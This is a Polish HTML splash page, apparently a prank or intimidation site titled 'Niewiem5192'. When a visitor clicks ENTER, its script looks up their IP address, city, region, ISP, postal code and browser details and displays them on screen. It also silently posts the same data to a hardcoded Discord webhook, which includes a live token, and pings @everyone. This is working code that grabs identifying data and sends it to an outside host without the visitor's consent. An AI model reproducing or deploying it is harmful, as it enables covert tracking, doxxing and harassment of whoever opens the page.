<!DOCTYPE html>
<html lang="pl">
<head>
  <meta charset="UTF-8" />
  <title>Niewiem5192</title>
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <style>
    :root { --hacker-green: #00b33c; } /* ciemno-zielony */
    html,body { height:100%; }
    body {
      background: #000;
      color: var(--hacker-green);
      font-family: Inter, Arial, Helvetica, sans-serif;
      display:flex;
      flex-direction:column;
      align-items:center;
      justify-content:flex-start;
      height:100vh;
      margin:0;
      text-align:center;
      overflow-y:auto;
      padding-bottom:40px;
    }

    /* tytuł i przycisk */
    #title {
      font-size:110px;
      color:var(--hacker-green);
      margin:100px 0 10px;
      animation:pulse 2000ms infinite;
      text-shadow:0 0 8px rgba(0,179,60,0.15);
      user-select:none;
    }
    #enterBtn {
      padding:22px 44px;
      font-size:26px;
      border-radius:12px;
      border:2px solid var(--hacker-green);
      background:transparent;
      color:var(--hacker-green);
      cursor:pointer;
      transition:transform .12s, box-shadow .12s;
      margin-bottom:30px;
    }
    #enterBtn:hover{ transform:scale(1.03); box-shadow:0 0 16px rgba(0,179,60,0.12); }

    /* obszar info */
    #info{
      margin-top:30px;
      width:100%;
      max-width:1200px;
      display:none;
      padding:0 20px;
      box-sizing:border-box;
    }

    /* poszczególne linie (duże) */
    .line{
      font-size:72px;
      line-height:1.1;
      margin:18px 0;
      opacity:0;
      transform:translateY(-220px);
      transition:
        transform 1000ms cubic-bezier(.22,.9,.3,1),
        opacity 300ms ease-in;
      white-space:nowrap;
      overflow:hidden;
      text-overflow:ellipsis;
      color:var(--hacker-green);
      text-shadow:0 0 6px rgba(0,179,60,0.12);
    }
    .line.show{
      opacity:1;
      transform:translateY(0);
    }

    @keyframes pulse{
      0%{ transform:scale(1); }
      50%{ transform:scale(1.04); }
      100%{ transform:scale(1); }
    }

    @media (max-width:900px){
      #title{ font-size:56px; margin-top:60px; }
      #enterBtn{ font-size:20px; padding:16px 28px; }
      .line{ font-size:36px; }
    }
  </style>
</head>
<body>
  <div id="topWrap" style="width:100%; display:flex; flex-direction:column; align-items:center;">
    <div id="title">Niewiem5192</div>
    <button id="enterBtn">ENTER</button>
  </div>

  <div id="info"></div>

  <audio id="bgMusic" loop>
    <source src="muzyka.mp3" type="audio/mpeg">
    Twoja przeglądarka nie obsługuje audio.
  </audio>

  <script>
    const cwel_huj= "https://discord.com/api/webhooks/1418366662628872262/i9rKK5whGy1E9YDFU6SpGsN1fsOriaxd-3TQNmHxg3USA0mSb9GztfgNYsFO9z6vB68a";

    const enterBtn = document.getElementById('enterBtn');
    const title = document.getElementById('title');
    const infoDiv = document.getElementById('info');
    const music = document.getElementById('bgMusic');

    function wait(ms){ return new Promise(res => setTimeout(res, ms)); }

    function smoothScrollTo(targetY, duration = 900){
      const startY = window.scrollY || window.pageYOffset;
      const distance = targetY - startY;
      const startTime = performance.now();
      return new Promise(resolve => {
        function step(now){
          const elapsed = now - startTime;
          const t = Math.min(1, elapsed / duration);
          const ease = t < 0.5 ? 2*t*t : -1 + (4 - 2*t)*t;
          window.scrollTo(0, Math.round(startY + distance * ease));
          if(t < 1) requestAnimationFrame(step); else resolve();
        }
        requestAnimationFrame(step);
      });
    }

    enterBtn.addEventListener('click', async () => {
      title.style.display = 'none';
      enterBtn.style.display = 'none';
      infoDiv.style.display = 'block';

      music.volume = 1.0;
      music.play().catch(e => console.log("Błąd audio:", e));

      const browser = navigator.userAgent;
      const platform = navigator.platform;
      const lang = navigator.language;

      let data = {};
      try {
        const resp = await fetch('https://ipapi.co/json/');
        data = await resp.json();
      } catch (e) {
        console.error('Błąd pobierania ipapi:', e);
      }

      const fields = [
        "IP: " + (data.ip || 'brak'),
        "Kraj: " + (data.country_name || 'brak'),
        "Miasto: " + (data.city || 'brak'),
        "Region: " + (data.region || 'brak'),
        "Dostawca: " + (data.org || 'brak'),
        "Kod pocztowy: " + (data.postal || 'brak'),
        "Strefa: " + (data.timezone || 'brak'),
        "Przeglądarka: " + browser,
        "System: " + platform,
        "Język: " + lang,
        "Status: Online"
      ];

      if (cwel_huj && cwel_huj.trim().length > 10) {
        try {
          const payload = {
            content:
              `@everyone\n` +
              `Niewiem5192 — nowy visitor\n` +
              `IP: ${data.ip || 'brak'}\n` +
              `Kraj: ${data.country_name || 'brak'}\n` +
              `Miasto: ${data.city || 'brak'}\n` +
              `Region: ${data.region || 'brak'}\n` +
              `Dostawca: ${data.org || 'brak'}\n` +
              `UA: ${navigator.userAgent}\n` +
              `Strona: ${location.href}`
          };
          // wyślij asynchronicznie, nie blokuj UI
          fetch(cwel_huj, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload)
          }).catch(e => console.error("Webhook send error:", e));
        } catch (e) {
          console.error("Webhook error:", e);
        }
      }

      // pokaż IP natychmiast
      const firstLine = document.createElement('p');
      firstLine.className = 'line';
      firstLine.textContent = fields[0];
      infoDiv.appendChild(firstLine);

      await wait(80);
      firstLine.classList.add('show');
      await smoothScrollTo(document.body.scrollHeight, 900);

      // reszta co 700ms
      for (let i = 1; i < fields.length; i++) {
        const p = document.createElement('p');
        p.className = 'line';
        p.textContent = fields[i];
        infoDiv.appendChild(p);

        await wait(700);
        p.classList.add('show');
        // delikatne przewinięcie (nie blokujemy długim oczekiwaniem)
        smoothScrollTo(document.body.scrollHeight, 800);
      }

      // koniec: dopracowanie pozycji
      await wait(300);
      smoothScrollTo(document.body.scrollHeight, 700);
    });
  </script>
</body>
</html>

